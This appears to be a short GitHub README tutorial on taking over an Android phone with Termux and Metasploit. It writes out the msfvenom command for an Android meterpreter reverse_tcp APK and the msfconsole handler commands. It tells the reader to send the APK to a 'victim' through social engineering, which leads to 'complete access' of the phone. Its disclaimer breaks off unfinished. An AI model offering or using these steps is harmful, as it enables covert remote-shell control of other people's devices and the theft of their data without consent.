# metasploit-with-termux
Hi....this is a tutorial on how to hack a phone with termux....this is only for 


REQUIREMENTS:
1.termux
2.Metasploit
3.a little patience


STEPS:-
 

Open Termux 
 

Install metasploit.Copy your Internal IP Address.
( use ifconfig command to view your ip addree)



Type msfvenom  in termux
 

Enter the following commands in a new terminal to
generate the Reverse TCP Payload. (Note: Replace the 
LHOST with your internal IP.

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 R >/sdcard/FILENAME.apk
 -p : Specify Payload
 

LHOST : Your ip address
 

LPORT : Listening Port number
 

R : RAW Format
 

>/sdcard/FILENAME.apk => Location to save the Payload
 

So, That’s it! You’re almost halfway into hacking
that Android device! Just send your Payload to the
Victim(Using some Social Engineering :P). You can find
your payload in sdcard FILENAME.apk



PART 2: STARTING A LISTENER:-
 

 Open new terminal Type 
msfconsole
 

 

Type
use exploit/multi/handler
 

Type
set payload android/meterpreter/reverse_tcp


Type
set LHOST 192.168.1.3 (Enter your Internal IP same as in the 1st Part)
 

Type
set LPORT 4444
 

Type
exploit
 

Now as soon as the Victim installs and tries to open
up the Payload(apk) on their device, you’ll get a
Meterpreter Session.




🤯🤯🤯SO, THERE YOU HAVE IT. COMPLETE ACCESS OF THE
VICTIM’S PHONE RIGHT ON YOUR SCREEN!


 
